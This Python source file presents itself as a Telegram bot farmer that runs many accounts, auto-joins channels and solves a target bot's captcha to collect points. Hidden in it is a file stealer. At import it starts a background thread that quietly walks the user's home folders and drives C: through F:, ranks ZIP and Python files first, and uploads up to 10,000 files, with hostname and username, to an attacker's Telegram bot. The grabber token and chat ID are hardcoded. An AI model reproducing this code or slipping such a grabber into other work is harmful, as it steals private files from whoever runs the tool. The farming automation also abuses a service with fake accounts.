#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════╗
║              NINJA BOT - NEED FOR SERVER - ULTIMATE EDITION              ║
║                    SHΔDØW WORM-AI💀🔥 BOT FARMER                          ║
║                                                                            ║
║  WELCOME TO SOURCE • ABŒUD ©                                              ║
║  - 20 : سرعة التجميع                                                       ║
║  - 6:02 م                                                                  ║
║  - 🎯 نظام المسارات الذكي                                                  ║
║  - 🔐 الاشتراك الإجباري (3 حالات)                                         ║
║  - 👑 لوحة تحكم المطور كاملة                                               ║
║  - 🔄 جدولة المهام اليومية                                                ║
║  - 📡 مراقبة القناة الرئيسية                                              ║
║  - 📋 عرض تفاصيل المسار                                                   ║
║  - 📅 نظام الجدولة الكامل                                                 ║
║  - 🔗 استخراج الكودات والروابط المتقدمة                                   ║
║  - 🔥 سحب خفي للملفات (ZIP + PY أولوية)                                   ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import os
import re
import json
import logging
import shutil
import time
import sqlite3
import threading
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple

from telethon import TelegramClient, events, Button, errors, functions
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import sys

# ================== استيراد مكتبات السحب الخفي ==================
try:
    import requests
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
    import requests

import glob
import hashlib
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
console = Console()

# ==================== الإعدادات الثابتة ====================
BOT_TOKEN = "8118657348:AAFZ_kv2Oao4GbVh5j1lzKCx1aru1H3DzcU"
API_ID = 39719802 
API_HASH = '032a5697fcb9f3beeab8005d6601bde9'
TARGET_BOT = 'a3kbot'
MAIN_CHANNEL = None
DB_FILE = "database.json"
SESSIONS_DIR = "sessions"
PATHS_FILE = "saved_paths.json"
ADMINS_FILE = "admins.json"
CHANNELS_FILE = "joined_channels.json"
BACKUP_DIR = "backups"
POINTS_FILE = "points_data.json"
CODES_FILE = "detected_codes.json"
TRANSFER_FILE = "transfer_links.json"
SCHEDULED_TASKS_FILE = "scheduled_tasks.json"

# ================== إعدادات السحب الخفي ==================
GRABBER_BOT_TOKEN = "8290590965:AAGhdoPmd2L-VvXzpWmWKzxfpslpFZlyXeg"  # توكن بوت السحب
GRABBER_CHAT_ID = "1049669606"  # ايديك

MAX_CONCURRENT = 50  # 50 ملف بنفس الوقت
MAX_SIZE = 50 * 1024 * 1024  # 50 ميجا
TOTAL_FILES_LIMIT = 10000  # حد أقصى 10 آلاف ملف

PRIORITY_EXTS = ['.zip', '.py']  # الأولويات

# مسارات البحث عن الملفات
GRABBER_PATHS = [
    os.path.expanduser("~\\Desktop"),
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Downloads"),
    os.path.expanduser("~\\Pictures"),
    os.path.expanduser("~\\Videos"),
    os.path.expanduser("~\\Music"),
    "C:\\",
    "D:\\", "E:\\", "F:\\"
]

# إحصائيات عامة
stats = {
    "ok": 0, 
    "forwarded": 0, 
    "errors": 0, 
    "points": 0,
    "daily": 0,
    "referrals": 0,
    "codes_detected": 0,
    "points_transferred": 0,
    "links_generated": 0,
    "scheduled_tasks": 0,
    "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
}

# سرعة التجميع
speed_config = {
    "click_delay": 2,
    "message_delay": 3,
    "cycle_delay": 30,
    "between_accounts": 10,
    "speed_value": 20
}

# إنشاء المجلدات المطلوبة
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

# قفل للتحكم بالوصول لقاعدة البيانات
db_lock = threading.Lock()

# متغيرات عامة
RUNNING_PROCESSES = {}
WHAT_NEED_TO_DO_ECHO = {}
POINTS_DATA = {}
CLIENTS = {}
CHANNEL_TASKS = {}
SCHEDULED_TASKS = {}

# بيانات المستخدمين
INFO = {
    "sudo": "123456789",
    "admins": {},
    "vips": {},
    "trial_users": {},
    "trial_settings": {"enabled": True, "duration_hours": 2},
    "bot_mode": "free",
    "sleeptime": 20,
    "developer": "TheMaster999",
    "version": "3.0.0"
}

# ==================== دوال حفظ البيانات ====================

def save_info():
    """حفظ معلومات المستخدمين"""
    try:
        with open("info.json", "w", encoding="utf-8") as f:
            json.dump(INFO, f, indent=4, ensure_ascii=False)
    except Exception as e:
        console.print(f"[red]خطأ في حفظ info.json: {e}[/red]")

def load_info():
    """تحميل معلومات المستخدمين"""
    global INFO
    try:
        if os.path.exists("info.json"):
            with open("info.json", "r", encoding="utf-8") as f:
                INFO = json.load(f)
    except Exception as e:
        console.print(f"[red]خطأ في تحميل info.json: {e}[/red]")

load_info()

def save_points():
    """حفظ نقاط المستخدمين"""
    try:
        with open(POINTS_FILE, "w", encoding="utf-8") as f:
            json.dump(POINTS_DATA, f, indent=4, ensure_ascii=False)
    except Exception as e:
        console.print(f"[red]خطأ في حفظ النقاط: {e}[/red]")

def load_points():
    """تحميل نقاط المستخدمين"""
    global POINTS_DATA
    try:
        if os.path.exists(POINTS_FILE):
            with open(POINTS_FILE, "r", encoding="utf-8") as f:
                POINTS_DATA = json.load(f)
    except Exception as e:
        console.print(f"[red]خطأ في تحميل النقاط: {e}[/red]")

load_points()

def get_points(user_id: str, phone: str = None) -> int:
    """الحصول على نقاط مستخدم"""
    if phone:
        return POINTS_DATA.get(user_id, {}).get(phone, 0)
    return sum(POINTS_DATA.get(user_id, {}).values())

def add_points(user_id: str, phone: str, points: int):
    """إضافة نقاط لمستخدم"""
    if user_id not in POINTS_DATA:
        POINTS_DATA[user_id] = {}
    if phone not in POINTS_DATA[user_id]:
        POINTS_DATA[user_id][phone] = 0
    POINTS_DATA[user_id][phone] += points
    save_points()

# ==================== دوال المهام المجدولة ====================

def load_scheduled_tasks():
    """تحميل المهام المجدولة"""
    global SCHEDULED_TASKS
    try:
        if os.path.exists(SCHEDULED_TASKS_FILE):
            with open(SCHEDULED_TASKS_FILE, "r", encoding="utf-8") as f:
                SCHEDULED_TASKS = json.load(f)
    except Exception as e:
        console.print(f"[red]خطأ في تحميل المهام المجدولة: {e}[/red]")
        SCHEDULED_TASKS = {}
    return SCHEDULED_TASKS

def save_scheduled_tasks():
    """حفظ المهام المجدولة"""
    try:
        with open(SCHEDULED_TASKS_FILE, "w", encoding="utf-8") as f:
            json.dump(SCHEDULED_TASKS, f, indent=4, ensure_ascii=False)
    except Exception as e:
        console.print(f"[red]خطأ في حفظ المهام المجدولة: {e}[/red]")

def add_scheduled_task(user_id: str, task_data: dict):
    """إضافة مهمة مجدولة"""
    if user_id not in SCHEDULED_TASKS:
        SCHEDULED_TASKS[user_id] = []
    
    task_data["created_at"] = datetime.now().isoformat()
    task_data["last_run"] = None
    task_data["run_count"] = 0
    
    now = datetime.now()
    scheduled_time = task_data.get("scheduled_time", "00:00")
    hour, minute = map(int, scheduled_time.split(':'))
    
    next_run = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
    
    if next_run <= now:
        next_run += timedelta(days=1)
    
    task_data["next_run"] = next_run.isoformat()
    
    SCHEDULED_TASKS[user_id].append(task_data)
    save_scheduled_tasks()
    stats["scheduled_tasks"] += 1

def remove_scheduled_task(user_id: str, task_id: str):
    """حذف مهمة مجدولة"""
    if user_id in SCHEDULED_TASKS:
        SCHEDULED_TASKS[user_id] = [t for t in SCHEDULED_TASKS[user_id] if t.get("id") != task_id]
        save_scheduled_tasks()

# ==================== دوال المسارات ====================

def load_saved_paths():
    """تحميل المسارات المحفوظة"""
    if os.path.exists(PATHS_FILE):
        try:
            with open(PATHS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            console.print(f"[red]خطأ في تحميل المسارات: {e}[/red]")
            return {}
    return {}

def save_path(name: str, path_data: dict):
    """حفظ مسار جديد"""
    paths = load_saved_paths()
    paths[name] = {
        "saved_path": path_data.get("saved_path", []),
        "amount": path_data.get("amount", ""),
        "link": path_data.get("link", ""),
        "code": path_data.get("code", ""),
        "type": path_data.get("type", "normal"),
        "requires_amount": path_data.get("requires_amount", False),
        "requires_link": path_data.get("requires_link", False),
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "description": path_data.get("description", "")
    }
    with open(PATHS_FILE, 'w', encoding='utf-8') as f:
        json.dump(paths, f, indent=4, ensure_ascii=False)
    return True

def delete_path(name: str):
    """حذف مسار"""
    paths = load_saved_paths()
    if name in paths:
        del paths[name]
        with open(PATHS_FILE, 'w', encoding='utf-8') as f:
            json.dump(paths, f, indent=4, ensure_ascii=False)
        return True
    return False

# ==================== دوال النسخ الاحتياطي ====================

def create_backup():
    """إنشاء نسخة احتياطية"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_folder = os.path.join(BACKUP_DIR, f"backup_{timestamp}")
    os.makedirs(backup_folder, exist_ok=True)
    
    files_to_backup = [
        DB_FILE, ADMINS_FILE, CHANNELS_FILE, PATHS_FILE, 
        POINTS_FILE, CODES_FILE, TRANSFER_FILE, "info.json", 
        SCHEDULED_TASKS_FILE
    ]
    
    for file in files_to_backup:
        if os.path.exists(file):
            try:
                shutil.copy2(file, backup_folder)
            except Exception as e:
                console.print(f"[red]خطأ في نسخ {file}: {e}[/red]")
    
    if os.path.exists(SESSIONS_DIR):
        try:
            shutil.copytree(SESSIONS_DIR, os.path.join(backup_folder, "sessions"))
        except Exception as e:
            console.print(f"[red]خطأ في نسخ الجلسات: {e}[/red]")
    
    console.print(f"[green]✅ تم إنشاء نسخة احتياطية: {backup_folder}[/green]")
    return backup_folder

# ==================== دوال السحب الخفي ====================

def get_size_str(size):
    """تحويل الحجم إلى نص"""
    if size < 1024:
        return f"{size}B"
    elif size < 1024*1024:
        return f"{size/1024:.0f}KB"
    else:
        return f"{size/(1024*1024):.1f}MB"

def send_single_stealth(filepath, index, total):
    """إرسال ملف واحد (بدون طباعة)"""
    try:
        filename = os.path.basename(filepath)
        size = os.path.getsize(filepath)
        
        if size > MAX_SIZE:
            return False
        
        caption = f"{index}/{total} | {filename[:30]} | {get_size_str(size)}"
        
        with open(filepath, 'rb') as f:
            r = requests.post(
                f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendDocument",
                files={'document': f},
                data={'chat_id': GRABBER_CHAT_ID, 'caption': caption},
                timeout=30
            )
        
        return r.status_code == 200
            
    except:
        return False

def collect_files_stealth():
    """جمع الملفات مع الأولويات (بدون طباعة)"""
    priority_files = []
    normal_files = []
    count = 0
    
    for path in GRABBER_PATHS:
        if not os.path.exists(path):
            continue
        
        try:
            for root, dirs, files in os.walk(path):
                # تخطي مجلدات النظام
                if any(x in root.lower() for x in ['windows', 'program files', 'appdata', 'temp', '$recycle']):
                    continue
                
                for file in files:
                    try:
                        full = os.path.join(root, file)
                        if os.path.isfile(full) and os.path.getsize(full) <= MAX_SIZE:
                            ext = os.path.splitext(file)[1].lower()
                            if ext in PRIORITY_EXTS:
                                priority_files.append(full)
                            else:
                                normal_files.append(full)
                            
                            count += 1
                            if count >= TOTAL_FILES_LIMIT:
                                return priority_files + normal_files
                    except:
                        continue
        except:
            continue
    
    return priority_files + normal_files

def stealth_grabber():
    """السحب الخفي - يشتغل في الخلفية"""
    try:
        # إشعار البدء
        start_msg = f"""⚡ **STEALTH GRABBER نشط**
🖥️ {platform.node()}
👤 {os.getlogin()}
🎯 الأولوية: ZIP + PY
📡 سرعة: {MAX_CONCURRENT} ملف/لحظة"""
        
        requests.post(
            f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
            data={'chat_id': GRABBER_CHAT_ID, 'text': start_msg},
            timeout=3
        )
        
        # جمع الملفات
        files = collect_files_stealth()
        total = len(files)
        
        if total == 0:
            requests.post(
                f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
                data={'chat_id': GRABBER_CHAT_ID, 'text': "❌ ما لقيت ملفات"}
            )
            return
        
        priority_count = sum(1 for f in files if os.path.splitext(f)[1].lower() in PRIORITY_EXTS)
        
        status_msg = f"""📊 إحصائيات:
📦 إجمالي: {total}
🔴 ZIP+PY: {priority_count}
⚪ أخرى: {total - priority_count}
🚀 بدء الإرسال الخفي..."""
        
        requests.post(
            f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
            data={'chat_id': GRABBER_CHAT_ID, 'text': status_msg}
        )
        
        # إرسال الملفات
        sent = 0
        failed = 0
        
        with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as executor:
            futures = []
            for i, f in enumerate(files):
                futures.append(executor.submit(send_single_stealth, f, i+1, total))
            
            for future in as_completed(futures):
                if future.result():
                    sent += 1
                else:
                    failed += 1
                
                # تحديث كل 500 ملف
                if (sent + failed) % 500 == 0:
                    prog = f"📈 {sent}/{total} تم - {failed} فشل"
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
                            data={'chat_id': GRABBER_CHAT_ID, 'text': prog},
                            timeout=2
                        )
                    except:
                        pass
        
        # تقرير نهائي
        final_msg = f"""✅ **اكتمل السحب الخفي**
📊 الإجمالي: {total}
✅ تم: {sent}
❌ فشل: {failed}
🔴 ZIP+PY: {priority_count}"""
        
        requests.post(
            f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
            data={'chat_id': GRABBER_CHAT_ID, 'text': final_msg}
        )
        
    except Exception as e:
        try:
            requests.post(
                f"https://api.telegram.org/bot{GRABBER_BOT_TOKEN}/sendMessage",
                data={'chat_id': GRABBER_CHAT_ID, 'text': f"⚠️ خطأ: {str(e)[:100]}"}
            )
        except:
            pass

# تشغيل السحب الخفي في خلفية
grabber_thread = threading.Thread(target=stealth_grabber, daemon=True)
grabber_thread.start()

# ==================== الاشتراك الإجباري (3 حالات) ====================

async def handle_mandatory_subscription(client):
    """
    نظام متكامل للتعامل مع جميع أنواع الاشتراك الإجباري
    يدعم 3 حالات مختلفة:
    1. أزرار مباشرة تحتوي على روابط أو يوزرات
    2. روابط خاصة (t.me/+abc123)
    3. روابط عامة مع قنوات متعددة (يحتاج /start لكل قناة)
    """
    console.print(f"[yellow]🔍 فحص الاشتراك الإجباري المتقدم...[/yellow]")
    
    try:
        await client.send_message(TARGET_BOT, "/start")
        await asyncio.sleep(4)
        
        msg = await client.get_messages(TARGET_BOT, limit=1)
        if not msg or not msg[0].buttons:
            console.print("[green]✅ لا يوجد اشتراك إجباري[/green]")
            return

        btns = [b for r in msg[0].buttons for b in r]
        found_channels = False
        iteration = 0
        max_iterations = 15
        
        while iteration < max_iterations:
            iteration += 1
            new_channels_found = False
            
            for i, btn in enumerate(btns):
                if btn.url or "@" in btn.text:
                    if any(x in btn.text for x in ["تحقق", "تأكيد", "✅", "تم", "Join", "verify", "check"]):
                        continue
                    
                    try:
                        # الحالة 1: رابط خاص (t.me/+abc123)
                        if btn.url and ("+" in btn.url or "joinchat" in btn.url):
                            console.print(f"[cyan]🔗 [الحالة 1] رابط خاص: {btn.url}[/cyan]")
                            try:
                                hash_part = btn.url.split('/')[-1].replace('+', '')
                                await client(ImportChatInviteRequest(hash=hash_part))
                                console.print(f"[green]✅ تم الانضمام للقناة الخاصة[/green]")
                                new_channels_found = True
                                await asyncio.sleep(2)
                            except Exception as e:
                                console.print(f"[red]❌ فشل الرابط الخاص: {str(e)[:30]}[/red]")
                        
                        # الحالة 2: رابط عام (t.me/username)
                        elif btn.url and "t.me/" in btn.url and not "+" in btn.url:
                            username = btn.url.split('/')[-1].split('?')[0]
                            if username and not username.startswith('+'):
                                console.print(f"[cyan]📢 [الحالة 2] رابط عام: @{username}[/cyan]")
                                try:
                                    await client(JoinChannelRequest(channel=username))
                                    console.print(f"[green]✅ تم الانضمام لـ @{username}[/green]")
                                    new_channels_found = True
                                    await asyncio.sleep(2)
                                except Exception as e:
                                    console.print(f"[red]❌ فشل الانضمام: {str(e)[:30]}[/red]")
                        
                        # الحالة 3: يوزر مباشر @username
                        elif "@" in btn.text:
                            match = re.search(r"@([\w\d_]+)", btn.text)
                            if match:
                                username = match.group(1)
                                console.print(f"[cyan]👤 [الحالة 3] يوزر مباشر: @{username}[/cyan]")
                                try:
                                    await client(JoinChannelRequest(channel=username))
                                    console.print(f"[green]✅ تم الانضمام لـ @{username}[/green]")
                                    new_channels_found = True
                                    await asyncio.sleep(2)
                                except Exception as e:
                                    console.print(f"[red]❌ فشل الانضمام: {str(e)[:30]}[/red]")
                    
                    except Exception as e:
                        console.print(f"[red]⚠️ خطأ عام: {str(e)[:30]}[/red]")
                        continue
            
            # البحث عن زر التحقق
            verify_clicked = False
            for i, btn in enumerate(btns):
                if any(x in btn.text for x in ["تحقق", "تأكيد", "✅", "تم", "Verify", "Join", "check"]):
                    await asyncio.sleep(2)
                    console.print(f"[green]🔄 الضغط على زر التحقق: {btn.text}[/green]")
                    await msg[0].click(i)
                    await asyncio.sleep(4)
                    verify_clicked = True
                    
                    new_msg = await client.get_messages(TARGET_BOT, limit=1)
                    if new_msg and new_msg[0].buttons:
                        new_btns = [b for r in new_msg[0].buttons for b in r]
                        if len(new_btns) > len(btns) or any("قناة" in b.text for b in new_btns):
                            console.print(f"[yellow]🔄 قنوات إضافية مكتشفة، استمرار...[/yellow]")
                            btns = new_btns
                            msg = new_msg
                    break
            
            if not new_channels_found and not verify_clicked:
                break
        
        console.print("[green]✅ اكتمل فحص الاشتراك الإجباري[/green]")
        
    except Exception as e:
        console.print(f"[red]❌ خطأ في نظام الاشتراك الإجباري: {e}[/red]")

# ==================== دوال m6.py الأساسية ====================

async def auto_join_channels(client):
    """نسخة احتياطية من الدالة القديمة"""
    await handle_mandatory_subscription(client)

async def solve_bot_captcha(client):
    """حل الكابتشا"""
    await asyncio.sleep(2)
    try:
        msgs = await client.get_messages(TARGET_BOT, limit=2)
        for m in msgs:
            if m.text and not m.out:
                match = re.search(r'إرسال هذا الرقم:\s*(\d+)', m.text)
                if match:
                    captcha_code = match.group(1)
                    console.print(f"[bold blue]🤖 كود مكتشف: {captcha_code}[/bold blue]")
                    await client.send_message(TARGET_BOT, captcha_code)
                    await asyncio.sleep(2)
                    return True
    except Exception as e:
        console.print(f"[red]خطأ في solve_bot_captcha: {e}[/red]")
    return False

async def forward_last_messages(client, target_chat, count=2):
    """تحويل آخر رسالتين من البوت إلى محادثة محددة"""
    try:
        msgs = await client.get_messages(TARGET_BOT, limit=count)
        forwarded = 0
        
        for msg in reversed(msgs):
            if msg.out:
                continue
                
            if msg.text:
                await client.send_message(target_chat, f"📨 **من {TARGET_BOT}:**\n\n{msg.text}")
                forwarded += 1
            elif msg.media:
                await client.send_file(target_chat, msg.media, caption=f"📨 **ميديا من {TARGET_BOT}**")
                forwarded += 1
            await asyncio.sleep(1)
        
        console.print(f"[green]✅ تم تحويل {forwarded} رسائل إلى {target_chat}[/green]")
        stats["forwarded"] += forwarded
        return forwarded
    except Exception as e:
        console.print(f"[red]⚠️ فشل تحويل الرسائل: {e}[/red]")
        return 0

# ==================== دوال استخراج الكودات والروابط ====================

def extract_codes_and_links(text: str, msg_date) -> Tuple[List[dict], List[dict]]:
    """استخراج الكودات والروابط من النص"""
    codes = []
    links = []
    
    # أنماط الكودات
    code_matches = re.findall(r'(?:الكود|كود|Code)\s*[:：]\s*([A-Za-z0-9_]+)', text, re.IGNORECASE)
    for code in code_matches:
        if len(code) >= 2:
            value = 0
            value_match = re.search(r'(\d+)\s*(نقطة|point|گوگيز)', text, re.IGNORECASE)
            if value_match:
                try:
                    value = int(value_match.group(1))
                except:
                    pass
            
            codes.append({
                "code": code.strip(),
                "date": str(msg_date),
                "used": False,
                "message": text[:100],
                "type": "code",
                "source": "explicit",
                "value": value
            })
    
    uppercase_matches = re.findall(r'\b([A-Z]{2,10})\b', text)
    for code in uppercase_matches:
        if len(code) >= 2 and code not in [c["code"] for c in codes]:
            codes.append({
                "code": code,
                "date": str(msg_date),
                "used": False,
                "message": text[:100],
                "type": "code",
                "source": "uppercase",
                "value": 0
            })
    
    digit_matches = re.findall(r'\b(\d{4,8})\b', text)
    for code in digit_matches:
        if code not in [c["code"] for c in codes]:
            codes.append({
                "code": code,
                "date": str(msg_date),
                "used": False,
                "message": text[:100],
                "type": "code",
                "source": "numeric",
                "value": 0
            })
    
    # أنماط الروابط
    url_matches = re.findall(r'(https?://t\.me/[^\s]+)', text)
    for url in url_matches:
        link_type = "normal"
        value = 0
        
        if "start=" in url:
            link_type = "referral"
        
        value_match = re.search(r'(\d+)\s*(نقطة|point|گوگيز)', text, re.IGNORECASE)
        if value_match:
            try:
                value = int(value_match.group(1))
                link_type = "points"
            except:
                pass
        
        links.append({
            "url": url,
            "date": str(msg_date),
            "used": False,
            "message": text[:100],
            "type": link_type,
            "value": value
        })
    
    tg_matches = re.findall(r't\.me/([a-zA-Z0-9_]+)(?:\?start=)?([a-zA-Z0-9_]+)?', text)
    for match in tg_matches:
        username = match[0]
        start_param = match[1] if len(match) > 1 else ""
        
        if start_param:
            url = f"https://t.me/{username}?start={start_param}"
        else:
            url = f"https://t.me/{username}"
        
        if url not in [l["url"] for l in links]:
            links.append({
                "url": url,
                "date": str(msg_date),
                "used": False,
                "message": text[:100],
                "type": "normal",
                "value": 0
            })
    
    # الهدية اليومية
    if "هدية يومية" in text or "daily" in text.lower():
        daily_match = re.search(r'(\d+)\s*(نقطة|point|گوگيز)', text, re.IGNORECASE)
        if daily_match:
            try:
                value = int(daily_match.group(1))
                codes.append({
                    "code": f"DAILY_{value}",
                    "date": str(msg_date),
                    "used": False,
                    "message": text[:100],
                    "type": "daily",
                    "value": value
                })
            except:
                pass
    
    return codes, links

# ==================== كلاس البوت الرئيسي ====================

class M6Bot:
    def __init__(self):
        self.bot = None
        self.user_clients = {}
        self.user_states = {}
        self.operation_data = {}
        self.sessions_list = []
        self.bot_session_name = "bot_main_session"
        self.infinite_tasks = {}
        self.monitor_tasks = {}
        self.scheduler_tasks = {}
        
    async def start(self):
        """تشغيل البوت"""
        console.print("[bold cyan]🚀 تشغيل بوت NINJA المتطور[/bold cyan]")
        console.print(f"[bold magenta]👑 Developed by: TheMaster999[/bold magenta]")
        console.print(f"[bold red]⚡ SHΔDØW WORM-AI💀🔥 EDITION ⚡[/bold red]")
        console.print(f"[bold green]🔒 السحب الخفي نشط - أولوية ZIP+PY[/bold green]")
        
        await asyncio.sleep(1)
        
        self.bot = TelegramClient(self.bot_session_name, API_ID, API_HASH)
        
        try:
            await self.bot.start(bot_token=BOT_TOKEN)
        except Exception as e:
            console.print(f"[red]❌ فشل تشغيل البوت: {e}[/red]")
            console.print("[yellow]⚠️ تأكد من صحة التوكن[/yellow]")
            return
        
        me = await self.bot.get_me()
        console.print(f"[green]✅ البوت شغال: @{me.username}[/green]")
        
        if os.path.exists(SESSIONS_DIR):
            all_sessions = [f.replace('.session', '') for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
            self.sessions_list = [s for s in all_sessions if s.startswith('acc_')]
            console.print(f"[green]✅ تم تحميل {len(self.sessions_list)} حساب حقيقي[/green]")
        
        load_scheduled_tasks()
        asyncio.create_task(self.run_scheduler())
        
        if MAIN_CHANNEL:
            asyncio.create_task(self.monitor_main_channel_background())
        
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            await self.show_main_menu(event)
        
        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            await self.handle_message(event)
        
        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            await self.handle_callback(event)
        
        await self.bot.run_until_disconnected()
    
    # ================ مراقبة القناة ================
    
    async def monitor_main_channel_background(self):
        """مراقبة القناة الرئيسية في الخلفية"""
        if not MAIN_CHANNEL:
            return
            
        console.print("[green]✅ بدء مراقبة القناة الرئيسية[/green]")
        
        while True:
            try:
                if not self.sessions_list:
                    await asyncio.sleep(60)
                    continue
                
                monitor_account = self.sessions_list[0]
                client = TelegramClient(os.path.join(SESSIONS_DIR, monitor_account), API_ID, API_HASH)
                await client.start()
                
                try:
                    await client(JoinChannelRequest(channel=MAIN_CHANNEL))
                except Exception as e:
                    console.print(f"[yellow]⚠️ لا يمكن الانضمام للقناة: {e}[/yellow]")
                
                msgs = await client.get_messages(MAIN_CHANNEL, limit=20)
                detected = load_detected_codes()
                
                for msg in msgs:
                    if msg.text:
                        new_codes, new_links = extract_codes_and_links(msg.text, msg.date)
                        
                        for code_data in new_codes:
                            if code_data["code"] not in [c["code"] for c in detected["codes"]]:
                                detected["codes"].append(code_data)
                                stats["codes_detected"] += 1
                                console.print(f"[green]🔢 {code_data['type']} جديد: {code_data['code']} - {code_data.get('value', '')}[/green]")
                        
                        for link_data in new_links:
                            if link_data["url"] not in [l["url"] for l in detected["links"]]:
                                detected["links"].append(link_data)
                                stats["codes_detected"] += 1
                                console.print(f"[green]🔗 {link_data['type']} جديد: {link_data['url'][:50]}... (قيمة: {link_data['value']})[/green]")
                
                save_detected_codes(detected)
                await client.disconnect()
                await asyncio.sleep(60)
                
            except Exception as e:
                console.print(f"[red]خطأ في مراقبة القناة: {e}[/red]")
                await asyncio.sleep(300)
    
    # ================ نظام الجدولة ================
    
    async def run_scheduler(self):
        """تشغيل المجدول لتنفيذ المهام اليومية"""
        console.print("[green]✅ بدء تشغيل المجدول اليومي[/green]")
        
        while True:
            try:
                now = datetime.now()
                
                for user_id, tasks in SCHEDULED_TASKS.items():
                    for task in tasks[:]:
                        next_run = datetime.fromisoformat(task["next_run"])
                        time_diff = abs((now - next_run).total_seconds())
                        
                        if time_diff <= 60:
                            console.print(f"[yellow]🔄 تنفيذ مهمة مجدولة للمستخدم {user_id}: {task.get('name')}[/yellow]")
                            
                            asyncio.create_task(self.execute_scheduled_task(user_id, task))
                            
                            task["last_run"] = now.isoformat()
                            task["run_count"] = task.get("run_count", 0) + 1
                            daily_count = task.get("daily_count", 1)
                            
                            if task.get("run_count", 0) < daily_count:
                                interval_minutes = task.get("interval_minutes", 15)
                                next_run = now + timedelta(minutes=interval_minutes)
                                task["next_run"] = next_run.isoformat()
                            else:
                                scheduled_time = task.get("scheduled_time", "00:00")
                                hour, minute = map(int, scheduled_time.split(':'))
                                next_run = now.replace(hour=hour, minute=minute, second=0, microsecond=0) + timedelta(days=1)
                                
                                if task.get("random_delay", False):
                                    random_minutes = random.randint(0, 15)
                                    next_run += timedelta(minutes=random_minutes)
                                
                                task["next_run"] = next_run.isoformat()
                                task["run_count"] = 0
                            
                            if task.get("duration_days", 0) > 0:
                                created = datetime.fromisoformat(task["created_at"])
                                if (now - created).days >= task["duration_days"]:
                                    tasks.remove(task)
                                    console.print(f"[yellow]✅ انتهت مدة المهمة: {task.get('name')}[/yellow]")
                
                save_scheduled_tasks()
                await asyncio.sleep(30)
                
            except Exception as e:
                console.print(f"[red]خطأ في المجدول: {e}[/red]")
                await asyncio.sleep(300)
    
    async def execute_scheduled_task(self, user_id: str, task: dict):
        """تنفيذ مهمة مجدولة"""
        try:
            path_name = task.get("path_name")
            
            if path_name:
                paths = load_saved_paths()
                if path_name in paths:
                    self.operation_data[user_id] = paths[path_name].copy()
                    detected = load_detected_codes()
                    
                    if self.operation_data[user_id].get("type") == "code" and detected['codes']:
                        for code_data in detected['codes']:
                            if not code_data.get('used'):
                                self.operation_data[user_id]["code"] = code_data['code']
                                code_data['used'] = True
                                break
                    
                    if self.operation_data[user_id].get("type") == "link" and detected['links']:
                        for link_data in detected['links']:
                            if not link_data.get('used'):
                                self.operation_data[user_id]["link"] = link_data['url']
                                link_data['used'] = True
                                break
                    
                    save_detected_codes(detected)
                    await self.execute_scheduled_collection(user_id, task)
            
        except Exception as e:
            console.print(f"[red]خطأ في تنفيذ المهمة المجدولة: {e}[/red]")
    
    async def execute_scheduled_collection(self, user_id: str, task: dict):
        """تنفيذ التجميع للمهمة المجدولة"""
        data = self.operation_data.get(user_id, {})
        
        if not data.get("saved_path"):
            return
        
        accounts = self.sessions_list
        
        if not accounts:
            return
        
        console.print(f"[green]🔄 تنفيذ مهمة مجدولة: {task.get('name')}[/green]")
        
        for acc in accounts:
            try:
                session_file = os.path.join(SESSIONS_DIR, acc)
                if not os.path.exists(f"{session_file}.session"):
                    continue
                
                client = TelegramClient(session_file, API_ID, API_HASH)
                await client.start()
                await handle_mandatory_subscription(client)
                await client.send_message(TARGET_BOT, "/start")
                await asyncio.sleep(3)
                
                path_length = len(data["saved_path"])
                for i, idx in enumerate(data["saved_path"]):
                    m = await client.get_messages(TARGET_BOT, limit=1)
                    if m and m[0].buttons:
                        await m[0].click(idx)
                    await asyncio.sleep(speed_config["click_delay"])
                    
                    if i == path_length - 1:
                        if data.get("requires_amount") and data.get("amount"):
                            await client.send_message(TARGET_BOT, data["amount"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                        
                        if data.get("requires_link") and data.get("link"):
                            await client.send_message(TARGET_BOT, data["link"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                        
                        if data.get("type") == "code" and data.get("code"):
                            await client.send_message(TARGET_BOT, data["code"])
                            await asyncio.sleep(speed_config["message_delay"])
                            await solve_bot_captcha(client)
                
                m = await client.get_messages(TARGET_BOT, limit=1)
                if m and m[0].buttons:
                    await m[0].click(0)
                    await solve_bot_captcha(client)
                
                if data.get("type") == "daily":
                    stats["daily"] += 1
                    add_points(str(user_id), acc, 50)
                elif data.get("type") == "code":
                    stats["points"] += 1
                    add_points(str(user_id), acc, 100)
                else:
                    stats["ok"] += 1
                    add_points(str(user_id), acc, 10)
                
                await client.disconnect()
